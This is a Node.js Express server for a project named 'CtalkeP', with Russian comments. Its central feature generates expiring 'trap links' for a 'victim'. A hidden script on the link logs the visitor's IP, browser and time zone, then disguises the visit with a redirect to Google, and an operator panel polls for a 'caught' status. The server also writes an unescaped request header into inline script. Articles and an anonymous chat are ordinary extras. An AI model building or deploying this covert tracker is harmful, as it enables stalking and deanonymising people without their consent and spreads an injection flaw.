const express = require('express');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// Мидлвары для обработки JSON и раздачи статики
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Хранилища в оперативной памяти (без БД для максимальной производительности)
let ipLinks = {}; // Ссылки для сбора IP: { id: { createdAt } }
let ipResults = {}; // Результаты кликов: { linkId: { ip, device, timezone, city, time } }
let articles = [
    {
        id: "promo",
        title: "Добро пожаловать в CtalkeP",
        desc: "Стартовая статья проекта",
        content: "Это демонстрационная статья. Вы можете создавать свои статьи и зарабатывать виртуальную валюту!"
    }
];

// === ГАРАНТИРОВАННЫЙ ИСПРАВИТЕЛЬ "Cannot GET /" ===
// Если статика не сработала автоматически, этот роут принудительно отдаст index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// === АВТОПИНГЕР (ЧТОБЫ RENDER НЕ ВЫКЛЮЧАЛСЯ) ===
const APP_URL = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
setInterval(() => {
    axios.get(`${APP_URL}/ping`)
        .then(() => console.log('Самопинг успешно выполнен. Сервер активен.'))
        .catch(err => console.log('Пинг локального сервера (информация):', err.message));
}, 600000); // Каждые 10 минут

app.get('/ping', (req, res) => res.send('pong'));

// === АВТОМАТИЧЕСКАЯ ОЧИСТКА ССЫЛОК ЧЕРЕЗ 3 МИНУТЫ ===
setInterval(() => {
    const now = Date.now();
    for (const id in ipLinks) {
        if (now - ipLinks[id].createdAt > 180000) { // 180 000 мс = 3 минуты
            delete ipLinks[id];
            console.log(`Ссылка ${id} автоматически удалена по истечении 3 минут.`);
        }
    }
}, 10000); // Проверка каждые 10 секунд

// === ФУНКЦИОНАЛ: УЗНАТЬ IP ===

// 1. Создание короткой ссылки-ловушки
app.post('/api/ip/create', (req, res) => {
    const id = Math.random().toString(36).substring(2, 8);
    ipLinks[id] = {
        createdAt: Date.now()
    };
    res.json({ success: true, link: `${APP_URL}/t/${id}`, id });
});

// 2. Переход жертвы по ссылке (Сбор параметров и скрытый редирект)
app.get('/t/:id', (req, res) => {
    const id = req.params.id;
    if (!ipLinks[id]) {
        return res.send('<h1 style="font-family:sans-serif; text-align:center; margin-top:50px;">Ссылка не существует или истек срок ее действия (3 минуты)</h1>');
    }

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // Отдаем невидимый скрипт, который собирает часовой пояс и перенаправляет на Google
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Загрузка...</title>
        </head>
        <body>
            <script>
                const data = {
                    ip: "${ip}",
                    device: navigator.userAgent,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    city: "Определяется провайдером"
                };
                
                fetch('/api/ip/collect/${id}', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).then(() => {
                    window.location.href = "https://www.google.com";
                }).catch(() => {
                    window.location.href = "https://www.google.com";
                });
            </script>
        </body>
        </html>
    `);
});

// 3. Запись результатов на сервер и моментальное удаление ссылки-ловушки
app.post('/api/ip/collect/:id', (req, res) => {
    const id = req.params.id;
    if (ipLinks[id]) {
        ipResults[id] = {
            ip: req.body.ip,
            device: req.body.device,
            timezone: req.body.timezone,
            city: req.body.city,
            time: new Date().toLocaleTimeString()
        };
        // Моментально удаляем ссылку-ловушку после первого клика
        delete ipLinks[id];
        res.json({ success: true });
    } else {
        res.status(404).json({ error: "Ссылка более недействительна" });
    }
});

// 4. Опрос статуса ловушки админом панели
app.get('/api/ip/status/:id', (req, res) => {
    const id = req.params.id;
    if (ipResults[id]) {
        res.json({ status: 'caught', data: ipResults[id] });
    } else if (ipLinks[id]) {
        res.json({ status: 'pending' });
    } else {
        res.json({ status: 'expired' });
    }
});

// === ФУНКЦИОНАЛ: СТАТЬИ ===

// Получить список всех статей
app.get('/api/articles', (req, res) => {
    res.json(articles);
});

// Создать новую статью
app.post('/api/articles', (req, res) => {
    const { title, desc, content } = req.body;
    if (!title || !content) return res.status(400).json({ error: "Заполните все обязательные поля" });
    
    const id = Math.random().toString(36).substring(2, 10);
    const newArticle = { id, title, desc: desc || "Без описания", content };
    articles.push(newArticle);
    
    res.json({ success: true, article: newArticle });
});

// Получить содержание конкретной статьи
app.get('/api/articles/:id', (req, res) => {
    const article = articles.find(a => a.id === req.params.id);
    if (!article) return res.status(404).json({ error: "Статья не найдена" });
    res.json(article);
});

// === АНОНИМНЫЙ ЧАТ (SSE — СВЕРХЛЕГКИЙ СТРИМ) ===
let clients = [];

app.get('/api/chat/stream', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    
    clients.push(res);
    
    req.on('close', () => {
        clients = clients.filter(client => client !== res);
    });
});

app.post('/api/chat/send', (req, res) => {
    const { username, text, tag } = req.body;
    const message = { username, text, tag, time: new Date().toLocaleTimeString() };
    
    // Передаем всем активным пользователям без долгосрочного сохранения в БД
    clients.forEach(client => client.write(`data: ${JSON.stringify(message)}\n\n`));
    res.json({ success: true });
});

// Запуск сервера на порту
app.listen(PORT, () => {
    console.log(`[CtalkeP] Сервер успешно запущен на порту: ${PORT}`);
});
